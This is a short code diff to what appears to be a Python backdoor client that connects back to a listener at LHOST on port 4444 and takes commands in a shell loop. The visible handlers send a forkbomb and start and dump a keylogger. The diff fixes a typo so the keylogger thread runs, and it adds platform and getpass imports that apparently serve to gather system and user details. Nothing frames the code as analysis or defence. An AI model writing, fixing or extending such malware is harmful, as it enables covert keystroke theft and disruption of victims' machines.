@@ -11,11 +11,11 @@ import wave
 import pyaudio
 import pyautogui
 import termcolor
+import platform
+import getpass
 
 
-
-
-LHOST = "127.0.0.1";PORT = 4000
+LHOST = "127.0.0.1";PORT = 4444
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -182,7 +182,7 @@ def shell():
             reliable_send(termcolor.colored("[+] Done sent forkbomb", 'green'))
         elif cmd[:12] == "keylog_start":
             keylog = keylogger.Keylogger()
-            t = treading.Thread(target= keylog.start)
+            t = threading.Thread(target= keylog.start)
             t.start()
             reliable_send('[+] Keylogger started!')
         elif cmd[:11] == "keylog_dump":
